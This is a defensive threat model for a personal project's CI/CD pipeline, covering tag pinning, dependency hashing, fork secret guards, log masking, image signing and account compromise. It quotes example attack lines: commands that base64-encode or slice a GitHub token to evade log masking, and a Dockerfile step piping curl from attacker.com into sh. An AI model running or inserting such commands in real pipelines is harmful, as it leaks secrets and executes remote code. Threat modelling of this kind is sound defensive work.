# Threat Model

## Scope

This threat model covers the CI/CD pipeline of the Smart-Backup project.
It does not cover runtime security of the deployed container or the
application's own threat surface.

---

## Assets

| Asset | Sensitivity | Notes |
|-------|------------|-------|
| Source code | Medium | Personal project; no proprietary business logic |
| `GITHUB_TOKEN` | High | Can write packages, read repo |
| `SONAR_TOKEN` | Medium | Access to SonarCloud project |
| Container image (GHCR) | Medium | Published artifact; must not be tampered |
| SBOM + provenance | Low | Public attestation data |

---

## Threat Actors

| Actor | Motivation | Capability |
|-------|-----------|-----------|
| Automated supply-chain bots | Inject malicious code at scale | High volume, low sophistication |
| Dependency maintainer compromise | Backdoor widely-used packages | Moderate; requires maintainer account |
| Fork-based PR attacker | Exfiltrate CI secrets | Low-medium; limited by GitHub fork rules |
| Account compromise (session hijack) | Full pipeline control | High if successful |

---

## Attack Vectors and Controls

### SV-01 — Tag Mutation (Third-Party Actions)

**Attack:** Attacker modifies code behind a mutable tag (e.g., `@v4`) without
changing the tag reference used in CI.

**Control:** All actions pinned to full commit SHA.
Mutable tags are not used anywhere in the pipeline.

**Residual risk:** None for pinned actions. Risk remains if a pinned SHA
itself was never reviewed before pinning.

---

### SV-02 — Dependency Tampering (Supply-Chain)

**Attack:** A dependency in `requirements.txt` is updated with a malicious
payload. The attacker either compromises the maintainer's account or performs
a typosquatting attack.

**Controls:**
- `pip install --require-hashes` — rejects packages whose hash does not match
  the declared value. Any silent update to a package fails CI.
- `pip-audit --strict` — checks all dependencies against OSV/NVD CVE databases.
- `dependency_guard` job — flags any change to `requirements.txt` for
  mandatory CODEOWNER review.
- Bandit + Semgrep — may detect suspicious patterns in dependency code
  (subprocess calls, socket usage, eval) though not reliable against
  sophisticated obfuscation.

**Residual risk:** A backdoor introduced by a trusted maintainer with a valid
hash will pass hash verification. Detection relies on SAST tools, which are
not designed to detect intentional backdoors. This is a known limitation
(Trust on First Use / TOFU problem). Mitigation at enterprise level would
require a proxy repository (Artifactory/Nexus) with additional behavioral
scanning.

---

### SV-03 — PR Target / Fork Secret Leakage

**Attack:** A fork-based PR attempts to exfiltrate CI secrets by modifying
workflow files or injecting commands.

**Controls:**
- SonarCloud and Bandit restricted to `push` or non-fork PRs:
  ```yaml
  if: github.event_name == 'push' || github.event.pull_request.head.repo.fork == false
  ```
- `GITHUB_TOKEN` and `SONAR_TOKEN` are never exposed to fork runners.
- Branch protection requires CODEOWNER review before merge.

**Residual risk:** Low. Fork runners do not receive secrets by GitHub design.

---

### SV-04 — Secret Leakage via Logs

**Attack:** A malicious action or step encodes a secret in output using
base64 or partial extraction to bypass GitHub's automatic log masking.

**Example vectors:**
```bash
echo "${{ secrets.GITHUB_TOKEN }}" | base64        # bypasses masking
echo "${{ secrets.GITHUB_TOKEN:0:5 }}"             # partial extraction
```

**Controls:**
- `GITHUB_TOKEN` is scoped per-job with minimum required permissions.
- On `checks`/`tests`/`security` stages: `contents: read`, `pull-requests: read` only.
- No write permissions on early stages where most third-party tools run.
- Network isolation (`--network=none`) during Docker build prevents exfiltration
  at the most sensitive build stage.

**Residual risk:** Base64 encoding bypasses GH log masking. Mitigation is
limiting the value of the token rather than preventing encoding. A compromised
read-only token allows repository read access only — no package writes,
no secret modification.

---

### SV-05 — Container Image Tampering

**Attack:** Published image is replaced or modified after the CI build.

**Controls:**
- Image referenced by digest (`@sha256:...`) in all post-build steps.
- Cosign keyless signing attaches a verifiable signature tied to the OIDC
  identity of the GitHub Actions workflow.
- SLSA provenance records the exact workflow, inputs, and environment
  that produced the artifact.
- Cosign verify step confirms the signature before pipeline completes.

**Residual risk:** If the signing identity (GitHub OIDC) is compromised,
signatures can be forged. This is a systemic risk in keyless signing models.

---

### SV-06 — Account Compromise (Root of Trust Failure)

**Attack:** Attacker gains access to the CODEOWNER's GitHub account via
session hijacking, credential theft, or phishing. They create a branch,
insert malicious code, self-approve the PR, and trigger a successful CI run.

**Controls:**
- `git verify-commit` step fails if the commit is not GPG-signed.
  An attacker without the CODEOWNER's GPG private key cannot produce
  a valid signed commit, and CI will reject it at the `checks` stage.
- `conftest` (OPA) validates Dockerfile against declared policies.
  A `RUN curl http://attacker.com | sh` will fail if the policy
  prohibits network calls or requires specific base images.

**Residual risk:** If the attacker also controls the GPG key (e.g., key
stored unencrypted on the compromised machine), the commit verification
step provides no protection. This is the primary Single Point of Failure
in a solo project with one CODEOWNER.

**Enterprise mitigations (not applied here — acknowledged as out of scope):**
- Require 2+ CODEOWNER approvals
- Hardware security key (FIDO2/YubiKey) for account authentication
- Mandatory signed commits with HSM-backed keys
- External artifact verification system independent of GitHub

---

## Summary Table

| Threat | Likelihood | Impact | Controlled | Residual Risk |
|--------|-----------|--------|-----------|--------------|
| Tag mutation | Medium | High | ✅ SHA pinning | Low |
| Dependency backdoor | Low | High | ⚠️ Partial (hash + SAST) | Medium |
| Fork secret leakage | Medium | Medium | ✅ Fork guard + permissions | Low |
| Log-based secret extraction | Low | Medium | ⚠️ Partial (token scope) | Low-Medium |
| Image tampering | Low | High | ✅ Digest + Cosign + SLSA | Low |
| Account compromise | Low | Critical | ⚠️ GPG verify (breakable) | High |
